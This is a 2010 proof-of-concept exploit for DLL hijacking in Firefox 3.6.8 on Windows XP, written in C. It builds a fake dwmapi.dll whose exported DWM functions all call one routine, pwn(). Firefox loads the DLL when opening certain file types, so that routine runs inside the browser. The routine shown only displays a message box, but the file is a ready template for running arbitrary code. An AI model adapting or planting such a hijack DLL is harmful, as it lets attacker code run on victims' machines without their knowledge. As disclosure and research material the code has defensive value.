/* 
Exploit Title: Firefox <= 3.6.8 DLL Hijacking Exploit [dwmapi.dll]
Date: August 24, 2010
Author: Glafkos Charalambous (glafkos[@]astalavista[dot]com)
Version: Latest Firefox v3.6.8
Tested on: Windows XP SP3 En
Vulnerable extensions: .htm .html .jtx .mfp
Greetz: Astalavista, OffSEC, Exploit-DB
*/


#include <windows.h>
#define DllExport __declspec (dllexport)

DllExport void CPAcquireContext() { pwn(); }
DllExport void DWMAPI_100() { pwn(); }
DllExport void DWMAPI_101() { pwn(); }
DllExport void DwmEnableComposition() { pwn(); }
DllExport void DWMAPI_103() { pwn(); }
DllExport void DWMAPI_104() { pwn(); }
DllExport void DWMAPI_105() { pwn(); }
DllExport void DWMAPI_106() { pwn(); }
DllExport void DWMAPI_107() { pwn(); }
DllExport void DWMAPI_108() { pwn(); }
DllExport void DWMAPI_109() { pwn(); }
DllExport void DWMAPI_110() { pwn(); }
DllExport void DWMAPI_111() { pwn(); }
DllExport void DWMAPI_112() { pwn(); }
DllExport void DWMAPI_113() { pwn(); }
DllExport void DWMAPI_115() { pwn(); }
DllExport void DWMAPI_116() { pwn(); }
DllExport void DWMAPI_117() { pwn(); }
DllExport void DWMAPI_118() { pwn(); }
DllExport void DWMAPI_119() { pwn(); }
DllExport void DWMAPI_120() { pwn(); }
DllExport void DwmAttachMilContent() { pwn(); }
DllExport void DwmDefWindowProc() { pwn(); }
DllExport void DwmDetachMilContent() { pwn(); }
DllExport void DwmEnableBlurBehindWindow() { pwn(); }
DllExport void DwmEnableMMCSS() { pwn(); }
DllExport void DwmExtendFrameIntoClientArea() { pwn(); }
DllExport void DwmFlush() { pwn(); }
DllExport void DwmGetColorizationColor() { pwn(); }
DllExport void DwmGetCompositionTimingInfo() { pwn(); }
DllExport void DwmGetGraphicsStreamClient() { pwn(); }
DllExport void DwmGetGraphicsStreamTransformHint() { pwn(); }
DllExport void DwmGetTransportAttributes() { pwn(); }
DllExport void DwmGetWindowAttribute() { pwn(); }
DllExport void DwmIsCompositionEnabled() { pwn(); }
DllExport void DwmModifyPreviousDxFrameDuration() { pwn(); }
DllExport void DwmQueryThumbnailSourceSize() { pwn(); }
DllExport void DwmRegisterThumbnail() { pwn(); }
DllExport void DwmSetDxFrameDuration() { pwn(); }
DllExport void DwmSetPresentParameters() { pwn(); }
DllExport void DwmSetWindowAttribute() { pwn(); }
DllExport void DwmUnregisterThumbnail() { pwn(); }
DllExport void DwmUpdateThumbnailProperties() { pwn(); }

int pwn()
{
  MessageBox(0, "Firefox DLL Hijacking!", "DLL Message", MB_OK);
  return 0;
}